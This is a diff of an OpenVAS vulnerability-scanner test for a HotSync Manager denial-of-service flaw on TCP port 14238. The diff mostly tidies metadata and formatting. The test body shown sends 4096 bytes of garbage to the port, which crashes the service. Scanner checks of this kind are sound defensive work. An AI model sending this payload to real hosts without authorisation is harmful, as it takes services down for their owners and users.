@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: hotsync.nasl 4903 2017-01-02 12:13:57Z cfi $
 #
 # HotSync Manager Denial of Service attack
 #
@@ -27,8 +26,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.10102");
-  script_version("$Revision: 4903 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-01-02 13:13:57 +0100 (Mon, 02 Jan 2017) $");
+  script_version("2019-04-24T07:26:10+0000");
+  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(920);
   script_tag(name:"cvss_base", value:"5.0");
@@ -41,13 +40,10 @@ if(description)
   script_dependencies("find_service.nasl");
   script_require_ports(14238);
 
-  tag_summary = "It is possible to cause HotSync Manager to crash by 
-  sending a few bytes of garbage into its listening port TCP 14238.";
+  script_tag(name:"solution", value:"Block those ports from outside communication.");
 
-  tag_solution = "Block those ports from outside communication";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"It is possible to cause HotSync Manager to crash by
+  sending a few bytes of garbage into its listening port TCP 14238.");
 
   script_tag(name:"solution_type", value:"Mitigation");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -56,9 +52,12 @@ if(description)
 }
 
 port = 14238;
-if( ! get_port_state( port ) ) exit( 0 );
+if( ! get_port_state( port ) )
+  exit( 0 );
+
 soc = open_sock_tcp( port );
-if( ! soc ) exit( 0 );
+if( ! soc )
+  exit( 0 );
 
 data_raw = crap( 4096 ) + string( "\n" );
 send( socket:soc, data:data_raw );
